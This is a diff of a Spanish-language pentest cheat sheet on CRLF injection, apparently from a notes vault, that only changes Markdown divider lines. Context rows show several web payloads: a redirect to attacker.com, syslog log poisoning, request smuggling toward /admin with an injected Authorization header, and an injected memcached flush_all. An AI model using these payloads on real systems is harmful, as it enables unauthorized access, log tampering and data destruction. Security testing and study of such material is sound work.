@@ -19,7 +19,7 @@ linked:
 ---
 # CRLF Injection - Vectores Específicos
 
-***
+---
 
 ## Email Header Injection (SMTP)
 
@@ -52,7 +52,7 @@ Email body...
 → Combine con password reset → atacante intercepta tokens.
 ```
 
-___
+---
 
 ## Redirect Injection (`Location:` Header)
 
@@ -65,7 +65,7 @@ ___
 | `?url=https://target.com%2f%40attacker.com` | URL parser confusion (path vs userinfo) | Combo con Open Redirect parser bug. |
 ^crlfi-specific-redirect
 
-___
+---
 
 ## Log Injection / Log Poisoning
 
@@ -78,7 +78,7 @@ ___
 | `?msg=test%0d%0a<134>1%202025-01-01T00:00:00Z%20fakehost%20app%20-%20-%20-%20<malicious>` | Syslog priority manipulation | Logs forwarded a SIEM con parsing por priority. |
 ^crlfi-specific-log
 
-___
+---
 
 ## HTTP Request Smuggling Combo
 
@@ -91,7 +91,7 @@ ___
 | `?param=x%0d%0aAuthorization:%20Bearer%20...%0d%0a%0d%0aGET%20/admin%20HTTP/1.1%0d%0aHost:%20target%0d%0a%0d%0a` | Smuggle de request completo a `/admin` | Backend con CL/TE laxos. |
 ^crlfi-specific-hrs
 
-___
+---
 
 ## Memcached / Redis / FTP via Newlines
 
@@ -123,4 +123,4 @@ flush_all                  ← inyectado! Cache wipeada.
 → Combine: atacante setea propias keys + invalida legit.
 ```
 
-***
+---
